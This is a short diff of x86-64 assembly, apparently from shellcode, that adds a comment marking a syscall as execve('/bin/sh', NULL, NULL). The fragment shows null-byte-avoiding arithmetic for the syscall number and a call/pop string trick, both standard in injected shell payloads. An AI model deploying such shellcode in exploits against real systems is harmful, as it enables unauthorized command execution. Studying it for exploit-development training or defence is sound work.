@@ -10,7 +10,7 @@ code:
 	xor %rdx, %rdx
 	mov $0x1111114C, %rax
 	sub $0x11111111, %rax
-	syscall
+	syscall 		# execve("/bin/sh", NULL, NULL)
 
 shellstr:
 	call code
